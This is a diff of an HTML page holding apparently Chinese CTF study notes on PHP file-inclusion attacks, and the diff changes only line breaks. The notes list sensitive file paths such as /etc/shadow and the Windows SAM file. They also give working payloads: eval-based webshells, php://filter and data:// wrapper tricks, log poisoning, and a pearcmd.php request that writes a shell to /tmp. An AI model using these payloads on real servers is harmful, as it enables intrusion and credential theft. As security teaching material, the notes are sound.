@@ -8052,38 +8052,38 @@
 <h2 id="_3">常见的敏感信息路径：</h2>
 <h3 id="windows">Windows系统</h3>
 <blockquote>
-<p>c:\boot.ini // 查看系统版本
-c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件
-c:\windows\repair\sam // 存储Windows系统初次安装的密码
-c:\ProgramFiles\mysql\my.ini // MySQL配置
-c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码
+<p>c:\boot.ini // 查看系统版本<br />
+c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件<br />
+c:\windows\repair\sam // 存储Windows系统初次安装的密码<br />
+c:\ProgramFiles\mysql\my.ini // MySQL配置<br />
+c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码<br />
 c:\windows\php.ini // php 配置信息</p>
 </blockquote>
 <h3 id="linuxunix">Linux/Unix系统</h3>
 <blockquote>
-<p>/etc/passwd // 账户信息
-/etc/shadow // 账户密码文件
-/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件
-/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置
-/usr/local/app/php5/lib/php.ini // PHP相关配置
-/etc/httpd/conf/httpd.conf // Apache配置文件
+<p>/etc/passwd // 账户信息<br />
+/etc/shadow // 账户密码文件<br />
+/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件<br />
+/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置<br />
+/usr/local/app/php5/lib/php.ini // PHP相关配置<br />
+/etc/httpd/conf/httpd.conf // Apache配置文件<br />
 /etc/my.conf // mysql 配置文件</p>
 </blockquote>
 <h2 id="_4">本地包含</h2>
 <p>如果包含的是可执行的php文件，会执行，如果包含的不是可执行的会进行读取</p>
 <h4 id="_5">例题：</h4>
 <p><a href="http://123.206.31.85:49166/index.php?file=hello.php">http://123.206.31.85:49166/index.php?file=hello.php</a></p>
-<p>如果?file=/etc/passwd
+<p>如果?file=/etc/passwd<br />
 /etc/passwd包含用户信息的文件</p>
-<p>在/etc/passwd的源文件里有upload.php，可以上传文件，上传一张图片马。直接包含执行
-但是发现被过滤掉了&lt;?php和?&gt;替换为_和_
+<p>在/etc/passwd的源文件里有upload.php，可以上传文件，上传一张图片马。直接包含执行<br />
+但是发现被过滤掉了&lt;?php和?&gt;替换为_和_<br />
 直接用<script language=php>eval($_POST['cmd']);</script>替换就可以执行</p>
 <h2 id="_6">远程包含</h2>
 <h3 id="_7">条件</h3>
-<p>在php.ini里有两个重要的参数allow_url_fopen和allow_url_include
-allow_url_fopen:默认值是ON，允许url里的封装协议访问文件
+<p>在php.ini里有两个重要的参数allow_url_fopen和allow_url_include<br />
+allow_url_fopen:默认值是ON，允许url里的封装协议访问文件<br />
 allow_url_include:默认值是OFF,不允许包含url里的封装协议包含文件</p>
-<p>如果后缀名写死，比如传入的东西后面自动加上.php可以用?来绕过
+<p>如果后缀名写死，比如传入的东西后面自动加上.php可以用?来绕过<br />
 比如：http://xxxxx.index.php?file=1.txt?a.php，?是用来传参的，但是1.txt不需要任何参数，所以?没啥用，可以把帮助我们绕过.php</p>
 <h3 id="_8">伪协议</h3>
 <h4 id="php">php支持的伪协议</h4>
@@ -8142,14 +8142,14 @@ allow_url_include:默认值是OFF,不允许包含url里的封装协议包含文�
 </tbody>
 </table>
 <h4 id="php_1">PHP归档</h4>
-<p>例题：106.12.37.37:10007
-只要上传的是压缩包格式的文件，改个后缀啥的无所谓
-phpar://upload/xxxxx.xxx/phpinfo（自动加.php的）
+<p>例题：106.12.37.37:10007<br />
+只要上传的是压缩包格式的文件，改个后缀啥的无所谓<br />
+phpar://upload/xxxxx.xxx/phpinfo（自动加.php的）<br />
 zip://upload/xxxxx.xxx%23phpinfo（自动加.php的）</p>
 <h4 id="php_2">利用php流</h4>
 <h5 id="phpfilter">php://filter</h5>
-<p>php://filter是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式的文件函数非常有用，类似readfile()、file()和file_get_contents()，在数据流内容没有读取之前没有机会应用其他过滤器
-php://filter目标使用以下的参数作为它路径的一部分
+<p>php://filter是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式的文件函数非常有用，类似readfile()、file()和file_get_contents()，在数据流内容没有读取之前没有机会应用其他过滤器<br />
+php://filter目标使用以下的参数作为它路径的一部分<br />
 ?file=php://filter/convert.base64-encode/resource=index.php</p>
 <p>例题：<a href="http://chinalover.sinaapp.com/web7/index.php">http://chinalover.sinaapp.com/web7/index.php</a></p>
 <h5 id="phpinput">php://input</h5>
@@ -8166,18 +8166,18 @@ php://filter目标使用以下的参数作为它路径的一部分
 <p>data://text/plain/;base64,php马的base64形式，注意 + 要 url 编码</p>
 <p><img alt="image.png" src="../img/551828_urzsaz4k8igdq8sb/1595768507015-450a17a3-e2e0-409f-b7ac-33d09292012a-762052.png" /></p>
 <h4 id="_9">日志文件</h4>
-<p>在linux下，日志一般都在var/log下面
+<p>在linux下，日志一般都在var/log下面<br />
 通过bp抓包，改请求头上的内容，比如&lt;?php phpinfo();?&gt;就可以让日志文件包含我们需要的内容，通过包含日志文件就可以了，但是通常情况用户是没有权限去读取日志文件的</p>
 <h2 id="pearcmdphp">pearcmd.php利用</h2>
 <pre><code class="language-python">?+config-create+/&amp;p=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST['yichen'])?&gt;+/tmp/shell.php
 </code></pre>
-<p>这里面参数 p 是接受进来包含文件的参数，注意，在浏览器里会 url 编码，在 burp 里面写
-效果就是在 /tmp 目录下生成一个 shell.php
-<img alt="image.png" src="../img/551828_urzsaz4k8igdq8sb/1652870784190-79cd3640-b6a3-41bd-8ac8-ba4055d19507-522409.png" />
+<p>这里面参数 p 是接受进来包含文件的参数，注意，在浏览器里会 url 编码，在 burp 里面写<br />
+效果就是在 /tmp 目录下生成一个 shell.php<br />
+<img alt="image.png" src="../img/551828_urzsaz4k8igdq8sb/1652870784190-79cd3640-b6a3-41bd-8ac8-ba4055d19507-522409.png" /><br />
 <img alt="image.png" src="../img/551828_urzsaz4k8igdq8sb/1652871211016-5c0f4d46-fb6a-414b-9d8f-df87dc4cf8a6-642543.png" /></p>
 <h2 id="mark">系统环境mark一下以后在写</h2>
 <h4 id="session">session</h4>
-<p>PHP默认生成session文件在/tmp下
+<p>PHP默认生成session文件在/tmp下<br />
 在php.ini文件中存在session.upload_progress.enabled这个参数，默认开启，会在上传过程中生成上传进度文件，它的存储路径可以在phpinfo中找到</p>
 <p>看烦了，先看点别的</p>
 <blockquote>
